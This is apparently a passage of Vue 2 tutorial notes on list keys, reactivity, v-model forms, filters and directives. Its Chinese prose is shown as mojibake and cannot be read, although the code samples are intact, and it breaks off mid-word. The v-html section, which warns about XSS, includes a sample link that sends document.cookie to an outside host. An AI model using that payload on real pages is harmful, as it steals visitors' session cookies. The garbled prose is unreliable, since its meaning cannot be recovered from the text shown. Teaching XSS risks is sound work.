å¯éå†ï¼šæ•°ç»„ã€å¯¹è±¡ã€å­—ç¬¦ä¸²ï¼ˆç”¨çš„å¾ˆå°‘ï¼‰ã€æŒ‡å®šæ¬¡æ•°ï¼ˆç”¨çš„å¾ˆå°‘ï¼‰ 2. keyçš„åŸç†reactã€vueä¸­çš„keyæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿï¼ˆkeyçš„å†…éƒ¨åŸç†ï¼‰ è™šæ‹ŸDOMä¸­keyçš„ä½œç”¨ï¼š keyæ˜¯è™šæ‹ŸDOMå¯¹è±¡çš„æ ‡è¯†ï¼Œå½“æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒVueä¼šæ ¹æ®ã€æ–°æ•°æ®ã€‘ç”Ÿæˆã€æ–°çš„è™šæ‹ŸDOMã€‘, éšåVueè¿›è¡Œã€æ–°è™šæ‹ŸDOMã€‘ä¸ã€æ—§è™šæ‹ŸDOMã€‘çš„å·®å¼‚æ¯”è¾ƒï¼Œæ¯”è¾ƒè§„åˆ™å¦‚ä¸‹ï¼š å¯¹æ¯”è§„åˆ™ï¼š æ—§è™šæ‹ŸDOMä¸­æ‰¾åˆ°äº†ä¸æ–°è™šæ‹ŸDOMç›¸åŒçš„keyï¼š è‹¥è™šæ‹ŸDOMä¸­å†…å®¹æ²¡å˜, ç›´æ¥ä½¿ç”¨ä¹‹å‰çš„çœŸå®DOMï¼ è‹¥è™šæ‹ŸDOMä¸­å†…å®¹å˜äº†, åˆ™ç”Ÿæˆæ–°çš„çœŸå®DOMï¼Œéšåæ›¿æ¢æ‰é¡µé¢ä¸­ä¹‹å‰çš„çœŸå®DOMã€‚ æ—§è™šæ‹ŸDOMä¸­æœªæ‰¾åˆ°ä¸æ–°è™šæ‹ŸDOMç›¸åŒçš„keyï¼š åˆ›å»ºæ–°çš„çœŸå®DOMï¼Œéšåæ¸²æŸ“åˆ°åˆ°é¡µé¢ã€‚ ç”¨indexä½œä¸ºkeyå¯èƒ½ä¼šå¼•å‘çš„é—®é¢˜ï¼š è‹¥å¯¹æ•°æ®è¿›è¡Œï¼šé€†åºæ·»åŠ ã€é€†åºåˆ é™¤ç­‰ç ´åé¡ºåºæ“ä½œ:ä¼šäº§ç”Ÿæ²¡æœ‰å¿…è¦çš„çœŸå®DOMæ›´æ–° ==&gt; ç•Œé¢æ•ˆæœæ²¡é—®é¢˜, ä½†æ•ˆç‡ä½ã€‚ å¦‚æœç»“æ„ä¸­è¿˜åŒ…å«è¾“å…¥ç±»çš„DOMï¼šä¼šäº§ç”Ÿé”™è¯¯DOMæ›´æ–° ==&gt; ç•Œé¢æœ‰é—®é¢˜ã€‚ å¼€å‘ä¸­å¦‚ä½•é€‰æ‹©key?: æœ€å¥½ä½¿ç”¨æ¯æ¡æ•°æ®çš„å”¯ä¸€æ ‡è¯†ä½œä¸ºkey, æ¯”å¦‚idã€æ‰‹æœºå·ã€èº«ä»½è¯å·ã€å­¦å·ç­‰å”¯ä¸€å€¼ã€‚ å¦‚æœä¸å­˜åœ¨å¯¹æ•°æ®çš„é€†åºæ·»åŠ ã€é€†åºåˆ é™¤ç­‰ç ´åé¡ºåºæ“ä½œï¼Œä»…ç”¨äºæ¸²æŸ“åˆ—è¡¨ç”¨äºå±•ç¤ºï¼Œä½¿ç”¨indexä½œä¸ºkeyæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ å›¾è§£ 3. åˆ—è¡¨è¿‡æ»¤&lt;div id=\"root\"&gt; &lt;h2&gt;äººå‘˜åˆ—è¡¨&lt;/h2&gt; &lt;input type=\"text\" placeholder=\"è¯·è¾“å…¥åå­—\" v-model=\"keyWord\"&gt; &lt;ul&gt; &lt;li v-for=\"(p,index) of filPerons\" :key=\"index\"&gt; {{p.name}}-{{p.age}}-{{p.sex}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ keyWord:'', persons:[ {id:'001',name:'é©¬å†¬æ¢…',age:19,sex:'å¥³'}, {id:'002',name:'å‘¨å†¬é›¨',age:20,sex:'å¥³'}, {id:'003',name:'å‘¨æ°ä¼¦',age:21,sex:'ç”·'}, {id:'004',name:'æ¸©å…†ä¼¦',age:22,sex:'ç”·'} ] }, computed:{ filPerons(){ return this.persons.filter((p)=&gt;{ return p.name.indexOf(this.keyWord) !== -1 }) } } }) &lt;/script&gt; 4. åˆ—è¡¨æ’åº&lt;div id=\"root\"&gt; &lt;h2&gt;äººå‘˜åˆ—è¡¨&lt;/h2&gt; &lt;input type=\"text\" placeholder=\"è¯·è¾“å…¥åå­—\" v-model=\"keyWord\"&gt; &lt;button @click=\"sortType = 2\"&gt;å¹´é¾„å‡åº&lt;/button&gt; &lt;button @click=\"sortType = 1\"&gt;å¹´é¾„é™åº&lt;/button&gt; &lt;button @click=\"sortType = 0\"&gt;åŸé¡ºåº&lt;/button&gt; &lt;ul&gt; &lt;li v-for=\"(p,index) of filPerons\" :key=\"p.id\"&gt; {{p.name}}-{{p.age}}-{{p.sex}} &lt;input type=\"text\"&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ keyWord:'', sortType:0, //0åŸé¡ºåº 1é™åº 2å‡åº persons:[ {id:'001',name:'é©¬å†¬æ¢…',age:30,sex:'å¥³'}, {id:'002',name:'å‘¨å†¬é›¨',age:31,sex:'å¥³'}, {id:'003',name:'å‘¨æ°ä¼¦',age:18,sex:'ç”·'}, {id:'004',name:'æ¸©å…†ä¼¦',age:19,sex:'ç”·'} ] }, computed:{ filPerons(){ const arr = this.persons.filter((p)=&gt;{ return p.name.indexOf(this.keyWord) !== -1 }) //åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦éœ€è¦æ’åº if(this.sortType){ arr.sort((p1,p2)=&gt;{ return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age }) } return arr } } }) &lt;/script&gt; 5. Vueçš„æ•°æ®ç›‘æµ‹Vueç›‘è§†æ•°æ®çš„åŸç†ï¼š vueä¼šç›‘è§†dataä¸­æ‰€æœ‰å±‚æ¬¡çš„æ•°æ®ã€‚ å¦‚ä½•ç›‘æµ‹å¯¹è±¡ä¸­çš„æ•°æ®ï¼Ÿ é€šè¿‡setterå®ç°ç›‘è§†ï¼Œä¸”è¦åœ¨new Vueæ—¶å°±ä¼ å…¥è¦ç›‘æµ‹çš„æ•°æ®ã€‚ 1. å¯¹è±¡ä¸­åè¿½åŠ çš„å±æ€§ï¼ŒVueé»˜è®¤ä¸åšå“åº”å¼å¤„ç† 2. å¦‚éœ€ç»™åæ·»åŠ çš„å±æ€§åšå“åº”å¼ï¼Œè¯·ä½¿ç”¨å¦‚ä¸‹APIï¼š Vue.set(targetï¼ŒpropertyName/indexï¼Œvalue) æˆ– vm.$set(targetï¼ŒpropertyName/indexï¼Œvalue) å¦‚ä½•ç›‘æµ‹æ•°ç»„ä¸­çš„æ•°æ®ï¼Ÿ é€šè¿‡åŒ…è£¹æ•°ç»„æ›´æ–°å…ƒç´ çš„æ–¹æ³•å®ç°ï¼Œæœ¬è´¨å°±æ˜¯åšäº†ä¸¤ä»¶äº‹ï¼š 1. è°ƒç”¨åŸç”Ÿå¯¹åº”çš„æ–¹æ³•å¯¹æ•°ç»„è¿›è¡Œæ›´æ–°ã€‚ 2. é‡æ–°è§£ææ¨¡æ¿ï¼Œè¿›è€Œæ›´æ–°é¡µé¢ã€‚ åœ¨Vueä¿®æ”¹æ•°ç»„ä¸­çš„æŸä¸ªå…ƒç´ ä¸€å®šè¦ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š ä½¿ç”¨è¿™äº›API:push()ã€pop()ã€shift()ã€unshift()ã€splice()ã€sort()ã€reverse() Vue.set() æˆ– vm.$set() ç‰¹åˆ«æ³¨æ„ï¼šVue.set() å’Œ vm.$set() ä¸èƒ½ç»™vm æˆ– vmçš„æ ¹æ•°æ®å¯¹è±¡ æ·»åŠ å±æ€§ï¼ï¼ï¼ &lt;div id=\"root\"&gt; &lt;h1&gt;å­¦ç”Ÿä¿¡æ¯&lt;/h1&gt; &lt;button @click=\"student.age++\"&gt;å¹´é¾„+1å²&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"addSex\"&gt;æ·»åŠ æ€§åˆ«å±æ€§ï¼Œé»˜è®¤å€¼ï¼šç”·&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"student.sex = 'æœªçŸ¥' \"&gt;ä¿®æ”¹æ€§åˆ«&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"addFriend\"&gt;åœ¨åˆ—è¡¨é¦–ä½æ·»åŠ ä¸€ä¸ªæœ‹å‹&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"updateFirstFriendName\"&gt;ä¿®æ”¹ç¬¬ä¸€ä¸ªæœ‹å‹çš„åå­—ä¸ºï¼šå¼ ä¸‰&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"addHobby\"&gt;æ·»åŠ ä¸€ä¸ªçˆ±å¥½&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"updateHobby\"&gt;ä¿®æ”¹ç¬¬ä¸€ä¸ªçˆ±å¥½ä¸ºï¼šå¼€è½¦&lt;/button&gt; &lt;br/&gt; &lt;button @click=\"removeSmoke\"&gt;è¿‡æ»¤æ‰çˆ±å¥½ä¸­çš„æŠ½çƒŸ&lt;/button&gt; &lt;br/&gt; &lt;h3&gt;å§“åï¼š{{student.name}}&lt;/h3&gt; &lt;h3&gt;å¹´é¾„ï¼š{{student.age}}&lt;/h3&gt; &lt;h3 v-if=\"student.sex\"&gt;æ€§åˆ«ï¼š{{student.sex}}&lt;/h3&gt; &lt;h3&gt;çˆ±å¥½ï¼š&lt;/h3&gt; &lt;ul&gt; &lt;li v-for=\"(h,index) in student.hobby\" :key=\"index\"&gt; {{h}} &lt;/li&gt; &lt;/ul&gt; &lt;h3&gt;æœ‹å‹ä»¬ï¼š&lt;/h3&gt; &lt;ul&gt; &lt;li v-for=\"(h,index) in student.hobby\" :key=\"index\"&gt; {{h}} &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const vm = new Vue({ el:'#root', data:{ student:{ name:'tom', age:18, hobby:['æŠ½çƒŸ','å–é…’','çƒ«å¤´'], friends:[ {name:'jerry',age:35}, {name:'tony',age:36} ] } }, methods: { addSex(){ // Vue.set(this.student,'sex','ç”·') this.$set(this.student,'sex','ç”·') }, addFriend(){ this.student.friends.unshift({name:'jack',age:70}) }, updateFirstFriendName(){ this.student.friends[0].name = 'å¼ ä¸‰' }, addHobby(){ this.student.hobby.push('å­¦ä¹ ') }, updateHobby(){ // this.student.hobby.splice(0,1,'å¼€è½¦') // Vue.set(this.student.hobby,0,'å¼€è½¦') this.$set(this.student.hobby,0,'å¼€è½¦') }, removeSmoke(){ this.student.hobby = this.student.hobby.filter((h)=&gt;{ return h !== 'æŠ½çƒŸ' }) } } }) &lt;/script&gt; æœé›†è¡¨å•æ•°æ®è‹¥ï¼š&lt;input type=\"text\"/&gt;ï¼Œåˆ™v-modelæ”¶é›†çš„æ˜¯valueå€¼ï¼Œç”¨æˆ·è¾“å…¥çš„å°±æ˜¯valueå€¼ã€‚ è‹¥ï¼š&lt;input type=\"radio\"/&gt;ï¼Œåˆ™v-modelæ”¶é›†çš„æ˜¯valueå€¼ï¼Œä¸”è¦ç»™æ ‡ç­¾é…ç½®valueå€¼ã€‚ è‹¥ï¼š&lt;input type=\"checkbox\"/&gt; 1.æ²¡æœ‰é…ç½®inputçš„valueå±æ€§ï¼Œé‚£ä¹ˆæ”¶é›†çš„å°±æ˜¯checkedï¼ˆå‹¾é€‰ or æœªå‹¾é€‰ï¼Œæ˜¯å¸ƒå°”å€¼ï¼‰ 2.é…ç½®inputçš„valueå±æ€§: (1)v-modelçš„åˆå§‹å€¼æ˜¯éæ•°ç»„ï¼Œé‚£ä¹ˆæ”¶é›†çš„å°±æ˜¯checkedï¼ˆå‹¾é€‰ or æœªå‹¾é€‰ï¼Œæ˜¯å¸ƒå°”å€¼ï¼‰ (2)v-modelçš„åˆå§‹å€¼æ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆæ”¶é›†çš„çš„å°±æ˜¯valueç»„æˆçš„æ•°ç»„ å¤‡æ³¨ï¼šv-modelçš„ä¸‰ä¸ªä¿®é¥°ç¬¦ï¼š lazyï¼šå¤±å»ç„¦ç‚¹å†æ”¶é›†æ•°æ® numberï¼šè¾“å…¥å­—ç¬¦ä¸²è½¬ä¸ºæœ‰æ•ˆçš„æ•°å­— trimï¼šè¾“å…¥é¦–å°¾ç©ºæ ¼è¿‡æ»¤ &lt;div id=\"root\"&gt; &lt;form @submit.prevent=\"demo\"&gt; è´¦å·ï¼š&lt;input type=\"text\" v-model.trim=\"userInfo.account\"&gt; &lt;br/&gt;&lt;br/&gt; å¯†ç ï¼š&lt;input type=\"password\" v-model=\"userInfo.password\"&gt; &lt;br/&gt;&lt;br/&gt; å¹´é¾„ï¼š&lt;input type=\"number\" v-model.number=\"userInfo.age\"&gt; &lt;br/&gt;&lt;br/&gt; æ€§åˆ«ï¼š ç”·&lt;input type=\"radio\" name=\"sex\" v-model=\"userInfo.sex\" value=\"male\"&gt; å¥³&lt;input type=\"radio\" name=\"sex\" v-model=\"userInfo.sex\" value=\"female\"&gt; &lt;br/&gt;&lt;br/&gt; çˆ±å¥½ï¼š å­¦ä¹ &lt;input type=\"checkbox\" v-model=\"userInfo.hobby\" value=\"study\"&gt; æ‰“æ¸¸æˆ&lt;input type=\"checkbox\" v-model=\"userInfo.hobby\" value=\"game\"&gt; åƒé¥­&lt;input type=\"checkbox\" v-model=\"userInfo.hobby\" value=\"eat\"&gt; &lt;br/&gt;&lt;br/&gt; æ‰€å±æ ¡åŒº &lt;select v-model=\"userInfo.city\"&gt; &lt;option value=\"\"&gt;è¯·é€‰æ‹©æ ¡åŒº&lt;/option&gt; &lt;option value=\"beijing\"&gt;Sereinblog&lt;/option&gt; &lt;option value=\"shanghai\"&gt;ä¸Šæµ·&lt;/option&gt; &lt;option value=\"shenzhen\"&gt;æ·±åœ³&lt;/option&gt; &lt;option value=\"wuhan\"&gt;æ­¦æ±‰&lt;/option&gt; &lt;/select&gt; &lt;br/&gt;&lt;br/&gt; å…¶ä»–ä¿¡æ¯ï¼š &lt;textarea v-model.lazy=\"userInfo.other\"&gt;&lt;/textarea&gt; &lt;br/&gt;&lt;br/&gt; &lt;input type=\"checkbox\" v-model=\"userInfo.agree\"&gt;é˜…è¯»å¹¶æ¥å—&lt;a href=\"http://www.blog.com\"&gt;ã€Šç”¨æˆ·åè®®ã€‹&lt;/a&gt; &lt;button&gt;æäº¤&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ userInfo:{ account:'', password:'', age:18, sex:'female', hobby:[], city:'beijing', other:'', agree:'' } }, methods: { demo(){ console.log(JSON.stringify(this.userInfo)) } } }) &lt;/script&gt; è¿‡æ»¤å™¨(Vue3å·²å¼ƒç”¨)å®šä¹‰ï¼šå¯¹è¦æ˜¾ç¤ºçš„æ•°æ®è¿›è¡Œç‰¹å®šæ ¼å¼åŒ–åå†æ˜¾ç¤ºï¼ˆé€‚ç”¨äºä¸€äº›ç®€å•é€»è¾‘çš„å¤„ç†ï¼‰ã€‚è¯­æ³•ï¼š æ³¨å†Œè¿‡æ»¤å™¨ï¼šVue.filter(name,callback) æˆ– new Vue{filters:{}} ä½¿ç”¨è¿‡æ»¤å™¨ï¼š{{ xxx | è¿‡æ»¤å™¨å}} æˆ– v-bind:å±æ€§ = â€œxxx | è¿‡æ»¤å™¨åâ€ å¤‡æ³¨ï¼š è¿‡æ»¤å™¨ä¹Ÿå¯ä»¥æ¥æ”¶é¢å¤–å‚æ•°ã€å¤šä¸ªè¿‡æ»¤å™¨ä¹Ÿå¯ä»¥ä¸²è” å¹¶æ²¡æœ‰æ”¹å˜åŸæœ¬çš„æ•°æ®, æ˜¯äº§ç”Ÿæ–°çš„å¯¹åº”çš„æ•°æ® &lt;script type=\"text/javascript\" src=\"../js/dayjs.min.js\"&gt;&lt;/script&gt; //ç¬¬ä¸‰æ–¹åº“ï¼šè®°å½•æ—¶é—´ &lt;div id=\"root\"&gt; &lt;h2&gt;æ˜¾ç¤ºæ ¼å¼åŒ–åçš„æ—¶é—´&lt;/h2&gt; &lt;!-- è®¡ç®—å±æ€§å®ç° --&gt; &lt;h3&gt;ç°åœ¨æ˜¯ï¼š{{fmtTime}}&lt;/h3&gt; &lt;!-- methodså®ç° --&gt; &lt;h3&gt;ç°åœ¨æ˜¯ï¼š{{getFmtTime()}}&lt;/h3&gt; &lt;!-- è¿‡æ»¤å™¨å®ç° --&gt; &lt;h3&gt;ç°åœ¨æ˜¯ï¼š{{time | timeFormater}}&lt;/h3&gt; &lt;!-- è¿‡æ»¤å™¨å®ç°ï¼ˆä¼ å‚ï¼‰ --&gt; &lt;h3&gt;ç°åœ¨æ˜¯ï¼š{{time | timeFormater('YYYY_MM_DD') | mySlice}}&lt;/h3&gt; &lt;h3 :x=\"msg | mySlice\"&gt;Serein&lt;/h3&gt; &lt;/div&gt; &lt;div id=\"root2\"&gt; &lt;h2&gt;{{msg | mySlice}}&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //å…¨å±€è¿‡æ»¤å™¨ Vue.filter('mySlice',function(value){ return value.slice(0,4) }) new Vue({ el:'#root', data:{ time:1621561377603, //æ—¶é—´æˆ³ msg:'ä½ å¥½ï¼ŒSerein' }, computed: { fmtTime(){ return dayjs(this.time).format('YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss') } }, methods: { getFmtTime(){ return dayjs(this.time).format('YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss') } }, //å±€éƒ¨è¿‡æ»¤å™¨ filters:{ timeFormater(value,str='YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss'){ // console.log('@',value) return dayjs(value).format(str) } } }) new Vue({ el:'#root2', data:{ msg:'hello,blog!' } }) &lt;/script&gt; å†…ç½®æŒ‡ä»¤1. v-textæŒ‡ä»¤æˆ‘ä»¬å­¦è¿‡çš„æŒ‡ä»¤ï¼š v-bind : å•å‘ç»‘å®šè§£æè¡¨è¾¾å¼, å¯ç®€å†™ä¸º :xxx v-model : åŒå‘æ•°æ®ç»‘å®š v-for : éå†æ•°ç»„/å¯¹è±¡/å­—ç¬¦ä¸² v-on : ç»‘å®šäº‹ä»¶ç›‘å¬, å¯ç®€å†™ä¸º@ v-if : æ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰ v-else : æ¡ä»¶æ¸²æŸ“ï¼ˆåŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å­˜å­˜åœ¨ï¼‰ v-show : æ¡ä»¶æ¸²æŸ“ (åŠ¨æ€æ§åˆ¶èŠ‚ç‚¹æ˜¯å¦å±•ç¤º) v-textæŒ‡ä»¤ï¼š ä½œç”¨ï¼šå‘å…¶æ‰€åœ¨çš„èŠ‚ç‚¹ä¸­æ¸²æŸ“æ–‡æœ¬å†…å®¹ã€‚ ä¸æ’å€¼è¯­æ³•çš„åŒºåˆ«ï¼šv-textä¼šæ›¿æ¢æ‰èŠ‚ç‚¹ä¸­çš„å†…å®¹ï¼Œåˆ™ä¸ä¼šã€‚ &lt;div id=\"root\"&gt; &lt;div&gt;ä½ å¥½ï¼Œ{{name}}&lt;/div&gt; &lt;div v-text=\"name\"&gt;&lt;/div&gt; &lt;div v-text=\"str\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ name:'Serein', str:'&lt;h3&gt;ä½ å¥½å•Šï¼&lt;/h3&gt;' } }) &lt;/script&gt; 2. v-htmlæŒ‡ä»¤v-htmlæŒ‡ä»¤ï¼š ä½œç”¨ï¼šå‘æŒ‡å®šèŠ‚ç‚¹ä¸­æ¸²æŸ“åŒ…å«htmlç»“æ„çš„å†…å®¹ã€‚ ä¸æ’å€¼è¯­æ³•çš„åŒºåˆ«ï¼š v-htmlä¼šæ›¿æ¢æ‰èŠ‚ç‚¹ä¸­æ‰€æœ‰çš„å†…å®¹ï¼Œåˆ™ä¸ä¼šã€‚ v-htmlå¯ä»¥è¯†åˆ«htmlç»“æ„ã€‚ ä¸¥é‡æ³¨æ„ï¼šv-htmlæœ‰å®‰å…¨æ€§é—®é¢˜ï¼ï¼ï¼ï¼ åœ¨ç½‘ç«™ä¸ŠåŠ¨æ€æ¸²æŸ“ä»»æ„HTMLæ˜¯éå¸¸å±é™©çš„ï¼Œå®¹æ˜“å¯¼è‡´XSSæ”»å‡»ã€‚ ä¸€å®šè¦åœ¨å¯ä¿¡çš„å†…å®¹ä¸Šä½¿ç”¨v-htmlï¼Œæ°¸ä¸è¦ç”¨åœ¨ç”¨æˆ·æäº¤çš„å†…å®¹ä¸Šï¼ &lt;div id=\"root\"&gt; &lt;div&gt;ä½ å¥½ï¼Œ{{name}}&lt;/div&gt; &lt;div v-html=\"str\"&gt;&lt;/div&gt; &lt;div v-html=\"str2\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ name:'Serein', str:'&lt;h3&gt;ä½ å¥½å•Šï¼&lt;/h3&gt;', str2:'&lt;a href=javascript:location.href=\"http://www.baidu.com?\"+document.cookie&gt;å…„å¼Ÿæˆ‘æ‰¾åˆ°ä½ æƒ³è¦çš„èµ„æºäº†ï¼Œå¿«æ¥ï¼&lt;/a&gt;', } }) &lt;/script&gt; 3. v-cloakv-cloakæŒ‡ä»¤ï¼ˆæ²¡æœ‰å€¼ï¼‰ï¼š æœ¬è´¨æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼ŒVueå®ä¾‹åˆ›å»ºå®Œæ¯•å¹¶æ¥ç®¡å®¹å™¨åï¼Œä¼šåˆ æ‰v-cloakå±æ€§ã€‚ ä½¿ç”¨cssé…åˆv-cloakå¯ä»¥è§£å†³ç½‘é€Ÿæ…¢æ—¶é¡µé¢å±•ç¤ºå‡ºçš„é—®é¢˜ã€‚ &lt;style&gt; [v-cloak]{ display:none; } &lt;/style&gt; &lt;div id=\"root\"&gt; &lt;h2 v-cloak&gt;{{name}}&lt;/h2&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"http://localhost:8080/resource/5s/vue.js\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; console.log(1) new Vue({ el:'#root', data:{ name:'Serein' } }) &lt;/script&gt; 4. v-onceæŒ‡ä»¤ v-onceæ‰€åœ¨èŠ‚ç‚¹åœ¨åˆæ¬¡åŠ¨æ€æ¸²æŸ“åï¼Œå°±è§†ä¸ºé™æ€å†…å®¹äº†ã€‚ ä»¥åæ•°æ®çš„æ”¹å˜ä¸ä¼šå¼•èµ·v-onceæ‰€åœ¨ç»“æ„çš„æ›´æ–°ï¼Œå¯ä»¥ç”¨äºä¼˜åŒ–æ€§èƒ½ã€‚ &lt;div id=\"root\"&gt; &lt;h2 v-once&gt;åˆå§‹åŒ–çš„nå€¼æ˜¯:{{n}}&lt;/h2&gt; &lt;h2&gt;å½“å‰çš„nå€¼æ˜¯:{{n}}&lt;/h2&gt; &lt;button @click=\"n++\"&gt;ç‚¹æˆ‘n+1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ n:1 } }) &lt;/script&gt; 5. v-preæŒ‡ä»¤ è·³è¿‡å…¶æ‰€åœ¨èŠ‚ç‚¹çš„ç¼–è¯‘è¿‡ç¨‹ã€‚ å¯åˆ©ç”¨å®ƒè·³è¿‡ï¼šæ²¡æœ‰ä½¿ç”¨æŒ‡ä»¤è¯­æ³•ã€æ²¡æœ‰ä½¿ç”¨æ’å€¼è¯­æ³•çš„èŠ‚ç‚¹ï¼Œä¼šåŠ å¿«ç¼–è¯‘ã€‚ &lt;div id=\"root\"&gt; &lt;h2 v-pre&gt;Vueå…¶å®å¾ˆç®€å•&lt;/h2&gt; &lt;h2 &gt;å½“å‰çš„nå€¼æ˜¯:{{n}}&lt;/h2&gt; &lt;button @click=\"n++\"&gt;ç‚¹æˆ‘n+1&lt;/button&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; new Vue({ el:'#root', data:{ n:1 } }) &lt;/script&gt; 6. v-slotv-slotæŒ‡ä»¤ ä½œç”¨ï¼šç”¨äºæä¾›å‘½åçš„æ’æ§½æˆ–éœ€è¦æ¥æ”¶propçš„æ’æ§½ (å…·ä½“ä½¿ç”¨è¯·æŸ¥çœ‹æ’æ§½çŸ¥è¯†ç‚¹) è‡ªå®šä¹‰æŒ‡ä»¤è‡ªå®šä¹‰æŒ‡ä»¤æ€»ç»“ï¼š ä¸€ã€å®šä¹‰è¯­æ³•ï¼š å±€éƒ¨æŒ‡ä»¤ï¼šnew Vue({ directives:{æŒ‡ä»¤å:é…ç½®å¯¹è±¡} æˆ– }) new Vue({ directives{æŒ‡ä»¤å:å›è°ƒå‡½æ•°} }) å…¨å±€æŒ‡ä»¤ï¼š Vue.directive(æŒ‡ä»¤å,é…ç½®å¯¹è±¡) æˆ– Vue.directive(æŒ‡ä»¤å,å›è°ƒå‡½æ•°) äºŒã€é…ç½®å¯¹è±¡ä¸­å¸¸ç”¨çš„3ä¸ªå›è°ƒï¼š bindï¼šæŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶è°ƒç”¨ã€‚ insertedï¼šæŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶è°ƒç”¨ã€‚ updateï¼šæŒ‡ä»¤æ‰€åœ¨æ¨¡æ¿ç»“æ„è¢«é‡æ–°è§£ææ—¶è°ƒç”¨ã€‚ ä¸‰ã€å¤‡æ³¨ï¼š æŒ‡ä»¤å®šä¹‰æ—¶ä¸åŠ v-ï¼Œä½†ä½¿ç”¨æ—¶è¦åŠ v-ï¼› æŒ‡ä»¤åå¦‚æœæ˜¯å¤šä¸ªå•è¯ï¼Œè¦ä½¿ç”¨kebab-caseå‘½åæ–¹å¼ï¼Œä¸è¦ç”¨camelCaseå‘½åã€‚ &lt;div id=\"root\"&gt; &lt;h2&gt;{{name}}&lt;/h2&gt; &lt;h2&gt;å½“å‰çš„nå€¼æ˜¯ï¼š&lt;span v-text=\"n\"&gt;&lt;/span&gt; &lt;/h2&gt; &lt;!-- &lt;h2&gt;æ”¾å¤§10å€åçš„nå€¼æ˜¯ï¼š&lt;span v-big-number=\"n\"&gt;&lt;/span&gt; &lt;/h2&gt; --&gt; &lt;h2&gt;æ”¾å¤§10å€åçš„nå€¼æ˜¯ï¼š&lt;span v-big=\"n\"&gt;&lt;/span&gt; &lt;/h2&gt; &lt;button @click=\"n++\"&gt;ç‚¹æˆ‘n+1&lt;/button&gt; &lt;hr/&gt; &lt;input type=\"text\" v-fbind:value=\"n\"&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; //å®šä¹‰å…¨å±€æŒ‡ä»¤ Vue.directive('fbind',{ //æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰ bind(element,binding){ element.value = binding.value }, //æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶ inserted(element,binding){ element.focus() }, //æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶ update(element,binding){ element.value = binding.value } }) new Vue({ el:'#root', data:{ name:'Serein', n:1 }, directives:{ //bigå‡½æ•°ä½•æ—¶ä¼šè¢«è°ƒç”¨ï¼Ÿ1.æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰ã€‚ //2.æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶ã€‚ 'big-number'(element,binding){ // console.log('big') element.innerText = binding.value * 10 }, big(element,binding){ console.log('big',this) //æ³¨æ„æ­¤å¤„çš„thisæ˜¯window // console.log('big') element.innerText = binding.value * 10 }, fbind:{ //æŒ‡ä»¤ä¸å…ƒç´ æˆåŠŸç»‘å®šæ—¶ï¼ˆä¸€ä¸Šæ¥ï¼‰ bind(element,binding){ element.value = binding.value }, //æŒ‡ä»¤æ‰€åœ¨å…ƒç´ è¢«æ’å…¥é¡µé¢æ—¶ inserted(element,binding){ element.focus() }, //æŒ‡ä»¤æ‰€åœ¨çš„æ¨¡æ¿è¢«é‡æ–°è§£ææ—¶ update(element,binding){ element.value = binding.value } } } }) &lt;/script&gt; ç”Ÿå‘½å‘¨æœŸ1. å¼•å‡ºç”Ÿå‘½å‘¨æœŸ åˆåï¼šç”Ÿå‘½å‘¨æœŸå›è°ƒå‡½æ•°ã€ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€ç”Ÿå‘½å‘¨æœŸé’©å­ã€‚ æ˜¯ä»€ä¹ˆï¼šVueåœ¨å…³é”®æ—¶åˆ»å¸®æˆ‘ä»¬è°ƒç”¨çš„ä¸€äº›ç‰¹æ®Šåç§°çš„å‡½æ•°ã€‚ ç”Ÿå‘½å‘¨æœŸå‡½æ•°çš„åå­—ä¸å¯æ›´æ”¹ï¼Œä½†å‡½æ•°çš„å…·ä½“å†…å®¹æ˜¯ç¨‹åºå‘˜æ 